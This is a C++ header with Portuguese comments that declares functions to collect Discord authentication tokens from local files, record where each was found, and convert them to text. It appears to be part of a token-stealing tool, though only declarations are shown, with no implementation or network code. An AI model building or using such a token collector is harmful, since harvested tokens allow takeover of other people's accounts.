#pragma once
#include "pch.h"

struct DiscordToken {
    std::string token;
    std::string source; // caminho do arquivo onde foi encontrado
};

// diagnose=true: imprime hex dump para entender o formato, nao retorna tokens
std::vector<DiscordToken> collect_discord_tokens(bool diagnose = false);
std::string               discord_to_text(const std::vector<DiscordToken>& tokens);
